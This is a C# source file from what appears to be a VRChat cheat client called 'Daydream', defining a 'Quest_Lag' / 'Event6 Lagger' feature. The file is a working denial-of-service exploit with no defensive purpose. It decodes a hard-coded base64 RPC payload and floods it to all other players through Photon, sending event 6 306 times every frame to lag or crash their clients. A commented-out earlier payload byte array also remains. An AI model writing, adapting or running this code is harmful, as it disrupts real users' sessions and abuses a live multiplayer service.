using System;
using System.Collections;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ExitGames.Client.Photon;
using Il2CppSystem;
using MelonLoader;
using Photon.Realtime;
using UnityEngine;
using VRC.SDKBase;

namespace Daydream.Client.Hacks
{
    internal class Quest_Lag
    {
                private static bool enabled = false;
        public static void enable(bool val)
        {
            Classes.Daydream.HackUpdate("Event6 Lagger", val);
            enabled = val;
            MelonCoroutines.Start(run());
        }
        private static IEnumerator run()
        {
            // byte[] rpcData =
            // {
            //  106, 191, 218, 132, 88, 12, 0, 0, 0, 7,
            //   0, 58, 118, 213, 255, 255, 50, 47, 14, 0,
            //   255, 0, 0, 0, 0, 9, 0, 0, 0, 13,
            //   0, 69, 110, 97, 98, 108, 101, 77, 101, 115,
            //   104, 82, 80, 67, 0, 0, 0, 0, 0, 0,
            //    0, 2
            //  };
            //
            string s = "ap+OCswBAAAAJAA6MTg2QTEvVXNlckNhbWVyYUluZGljYXRvci9JbmRpY2F0b3IOAP8AAAAAAAAAAAoAVGltZXJCbG9vcAAAAAAEAAAL";
            byte[] Bytes = System.Convert.FromBase64String(s);
            //System.Buffer.BlockCopy(Il2CppSystem.BitConverter.GetBytes(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0.playerId), 0, NewData, 5, 4);
            for (; ; )
            {
                if (enabled == true)
                {
                    yield return new WaitForEndOfFrame();
                    for (int i = 0; i < 306; i++)
                    {
                        Hacks.PhotonExtentions.OpRaiseEvent(6, Bytes, new RaiseEventOptions
                        {
                            field_Public_ReceiverGroup_0 = 0
                        }, default(SendOptions));
                    }
                }
                else
                {
                    yield break;
                }
            }
        }
    }
}
